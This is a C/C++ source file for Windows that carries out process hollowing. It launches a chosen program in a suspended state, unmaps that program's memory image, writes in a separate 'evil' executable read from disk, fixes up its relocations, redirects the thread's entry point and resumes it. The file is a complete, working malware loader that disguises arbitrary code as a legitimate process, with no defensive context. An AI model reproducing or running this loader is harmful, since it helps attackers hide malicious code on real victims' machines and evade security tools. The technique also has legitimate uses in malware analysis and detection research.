#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


int main(int argc, char *argv[]) {

	// Creating Susspended Proccess And Mapping a File To Memory
	LPSTARTUPINFOA pStartupinfo = new STARTUPINFOA();
	PROCESS_INFORMATION proc_info;
	HANDLE HEvilFile;

	printf("Creating Susspended Process. [%s]\n",argv[1]);
	CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pStartupinfo, &proc_info);
	HEvilFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	DWORD EvilFileSize = GetFileSize(HEvilFile, NULL);
	PBYTE EvilImage = new BYTE[EvilFileSize];

	printf("Mamming File To Memory. [%s]\n", argv[2]);
	DWORD readbytes;
	ReadFile(HEvilFile, EvilImage, EvilFileSize, &readbytes, NULL);

	
	// Get All The Register Values
	printf("Geting Current Context.\n");
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(proc_info.hThread, pContext)) {
		printf("Error getting context\n");
		return 0;
	}
	

	// Get The Base Address Of The Susspended Process
	PVOID BaseAddress;
	ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);


	// Getting The Addres Of NtUnmapViewOfSection And unmmaping All the Sections
	printf("Unmapping Section.\n");
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection) fpNtUnmapViewOfSection;
	if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
		printf("Error Unmaping Section\n");
		return 0;
	}


	// Getting The DOS Header And The NT Header Of The Mapped File
	PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)EvilImage;
	PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS)((LPBYTE)EvilImage + dos_head->e_lfanew);


	// Allocaation Memory In the Susspended Process
	PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
	DWORD BaseOffset = (DWORD)BaseAddress - nt_head->OptionalHeader.ImageBase;
	printf("Original Process Base: 0x%p\nEvil File Base: 0x%p\nOffset: 0x%p\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);


	// Change The Files Base Address To The Base Address Of The Susspended Process
	nt_head->OptionalHeader.ImageBase = (DWORD)BaseAddress;

	// Write The Files Headers To The Allocated Memory In The Susspended Process
	if(!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)){
		printf("Failed to write Headers\n");
		return 0;
	}

	// Write All The Sections From The Mapped File To the Susspended Process
	PIMAGE_SECTION_HEADER sec_head;

	printf("Writing Sections:\n");
	//Loop Over Every Section
	for ( int i = 0; i < nt_head->FileHeader.NumberOfSections; i++)
	{
		// Get The Head Of the Current Section
		sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("0x%x -- Writing Section: %s\n", (LPBYTE)mem + sec_head->VirtualAddress, sec_head->Name);
		// Write The section From The File In the Allocated Memory
		if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((LPBYTE)mem + sec_head->VirtualAddress), (PVOID)((LPBYTE)EvilImage + sec_head->PointerToRawData), sec_head->SizeOfRawData, NULL)) {
			printf("Error Wriring section: %s. At: %x%p\n", sec_head->Name, (LPBYTE)mem + sec_head->VirtualAddress);
		}
	}

	// Check If There Is an Offset Between the Base Addresses
	if (BaseOffset) {

		printf("\nRelocating The Relocation Table...\n");

		// Loop Over Evey Section
		for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++)
		{
			// Get The Head Of the Current Section
			sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
			
			// Compare The Secction Name To The ".reloc" Section
			char pSectionName[] = ".reloc";
			if (memcmp(sec_head->Name, pSectionName, strlen(pSectionName))) {
				// If The Section Is Not The ".reloc" Section Conntinue To The Next Section
				continue;
			}

			// Get The Address Of the Section Data
			DWORD RelocAddress = sec_head->PointerToRawData;
			IMAGE_DATA_DIRECTORY RelocData = nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD Offset = 0;

			// Iterate Over The Relocation Table
			while (Offset < RelocData.Size){

				// Get The Head Of The Relocation Block
				PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK) &EvilImage[RelocAddress + Offset];
				printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->PageAddress, pBlockHeader->BlockSize);

				Offset += sizeof(BASE_RELOCATION_BLOCK);

				// Calculate The Entries In the Current Table
				DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
				printf("%d Entries Must Be Realocated In The Current Block.\n", EntryCount);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY) &EvilImage[RelocAddress + Offset];

				for (int x = 0; x < EntryCount; x++)
				{
					Offset += sizeof(BASE_RELOCATION_ENTRY);
					
					// If The Type Of The Enrty Is 0 We Dont Need To Do Anything
					if (pBlocks[x].Type == 0){
						printf("The Type Of Base Relocation Is 0. Skipping.\n");
						continue;
					}

					// Resolve The Adderss Of The Reloc
					DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;

					// Read The Value In That Address
					DWORD EnrtyAddress = 0;
					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(DWORD), 0);

					printf("0x%x --> 0x%x | At:0x%x\n", EnrtyAddress, EnrtyAddress + BaseOffset,(PVOID)((DWORD)BaseAddress + FieldAddress));
					
					// Add The Correct Offset To That Address And Write It
					EnrtyAddress += BaseOffset;
					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(DWORD), 0)){
						printf("Error Writing Entry.");
					}
				}
			}
		}
	}

	// Write The New Image Base Address
	WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entrypoint
	DWORD EntryPoint = (DWORD)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
	pContext->Eax = EntryPoint;

	printf("\nSetting Thread Context.\n");
	if (!SetThreadContext(proc_info.hThread, pContext)){
		printf("Error setting context\n");
		return 0;
	}

	printf("Resuming Thread.\n");
	if (!ResumeThread(proc_info.hThread)){
		printf("Error resuming thread\n");
		return 0;
	}


	printf("\nDone. Enjoy The \"New\" Process.\n---------------------------------\n\n");
	return 0;
}
